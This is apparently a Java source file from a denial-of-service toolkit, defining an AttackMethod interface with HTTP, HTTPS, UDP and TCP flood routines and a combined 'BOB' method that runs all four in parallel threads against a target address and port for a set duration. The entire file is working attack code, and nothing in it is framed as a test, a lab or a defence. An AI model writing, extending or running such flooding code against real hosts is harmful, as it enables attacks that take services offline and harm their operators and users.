package org.rce4j.net.dos;

import java.io.IOException;
import java.io.UncheckedIOException;
import java.net.*;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;

@FunctionalInterface
public interface AttackMethod extends Consumer<DosAttack> {
    AttackMethod HTTP_FLOOD = d -> {
        long endTime = System.currentTimeMillis() + d.getDuration();
        
        URL url;
        try {
            url = URI.create("http://" + d.getAddress().toString())
                    .toURL();
        } catch (MalformedURLException e) {
            throw new UncheckedIOException(e);
        }
        while (System.currentTimeMillis() < endTime) {
            try {
                HttpURLConnection conn = (HttpURLConnection) url
                        .openConnection();
                conn.setRequestMethod("GET");
                System.out.println(conn.getContent());
            } catch (IOException ignored) {
            }
        }
    };
    
    AttackMethod HTTPS_FLOOD = d -> {
        long endTime = System.currentTimeMillis() + d.getDuration();
        
        URL url;
        try {
            url = URI.create("https://" + d.getAddress().toString())
                    .toURL();
        } catch (MalformedURLException e) {
            throw new UncheckedIOException(e);
        }
        while (System.currentTimeMillis() < endTime) {
            try {
                HttpURLConnection conn = (HttpURLConnection) url
                        .openConnection();
                conn.setRequestMethod("GET");
                System.out.println(conn.getContent());
            } catch (IOException ignored) {
            }
        }
    };
    
    AttackMethod UDP_FLOOD = d -> {
        Random random = new Random();
        
        try {
            long endTime = System.currentTimeMillis() + d.getDuration();
            DatagramSocket udpSocket = new DatagramSocket();
            
            byte[] BIG_PACKET = new byte[65000 * d.getPower() / 100];
            random.nextBytes(BIG_PACKET);
            
            while (System.currentTimeMillis() < endTime) {
                try {
                    udpSocket.send(new DatagramPacket(BIG_PACKET,
                            BIG_PACKET.length,
                            InetAddress.getByName(d.getAddress().toString()),
                            d.getPort()));
                } catch (IOException ignored) {
                }
            }
            udpSocket.close();
        } catch (IOException ignored) {
        }
    };
    
    AttackMethod TCP_FLOOD = d -> {
        long endTime = System.currentTimeMillis() + d.getDuration();
        
        while (System.currentTimeMillis() < endTime) {
            try {
                new Socket(d.getAddress().toString(), d.getPort()).close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    };
    
    AttackMethod BOB = d -> { // his name is bob because he's a Boomer-on-Bromine
        try {
            ExecutorService executor = Executors.newFixedThreadPool(4);
            
            executor.submit(() -> HTTP_FLOOD.accept(d));
            executor.submit(() -> HTTPS_FLOOD.accept(d));
            executor.submit(() -> UDP_FLOOD.accept(d));
            executor.submit(() -> TCP_FLOOD.accept(d));
            
            //noinspection ResultOfMethodCallIgnored
            executor.awaitTermination(d.getDuration() + 5000L, TimeUnit.MILLISECONDS);
        } catch (InterruptedException ignored) {
        }
    };
}
